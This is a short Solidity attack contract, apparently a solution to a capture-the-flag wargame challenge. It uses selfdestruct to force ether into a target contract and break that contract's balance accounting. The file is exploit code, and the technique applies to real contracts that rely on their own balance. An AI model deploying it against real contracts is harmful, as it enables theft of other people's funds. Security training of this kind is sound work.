// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.21;

// This contract will selfdestruct and forcibly send ETH to the target challenge contract.
// It bypasses the startBalance accounting by manipulating the contract's balance directly.
contract RetirementFundAttacker {
    function destroyAndSend(address target) public payable {
        selfdestruct(target);
    }
}